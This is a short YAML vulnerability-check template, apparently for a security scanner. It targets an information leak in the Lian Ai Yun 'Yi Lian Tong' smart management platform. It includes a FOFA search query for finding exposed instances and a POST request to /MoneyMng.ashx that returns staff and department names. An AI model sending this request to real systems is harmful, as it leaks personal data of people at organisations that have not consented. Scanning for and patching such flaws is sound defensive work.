id: poc-yaml-lian-ai-yun-moneymng-info-leak
info:
  name: 脸爱云一脸通智慧平台 MoneyMng 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: 一脸通智慧管理平台
  fofa: title="欢迎使用脸爱云 一脸通智慧管理平台"
requests:
- method: POST
  path: /MoneyMng.ashx
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: funcName=getDataAll
  expression: status_code == 200 && contains(body,"getRyxx") && matches(body,"\"bmmc\\\\\":\\\\\"[\u4e00-\u9fa50-9]+\\\\\"")
    && matches(body,"\"ryxm\\\\\":\\\\\"[\u4e00-\u9fa5]+\\\\\"")
variables: {}
transport: http
